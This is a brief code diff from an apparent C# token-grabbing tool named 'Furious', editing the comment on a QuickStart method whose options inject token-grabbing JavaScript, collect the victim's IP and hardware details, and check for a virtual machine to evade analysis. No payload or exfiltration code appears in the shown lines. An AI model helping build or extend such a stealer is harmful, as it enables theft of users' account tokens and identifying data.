@@ -35,7 +35,7 @@ namespace Furious
 
 		public static async Task QuickStart(bool injectJS = false, bool grabIP = false, bool grabHardware = false, bool checkForVM = false)
 		{
-			///This method allows the user to customise what data is collected and whether they want to inject the token grabbing code.
+			///This method allows the user to customise what data is collected, whether they want to inject the token grabbing code, and choose to check for a virtual machine.
 			if (checkForVM)
 				CheckForVM();
 			if (injectJS)
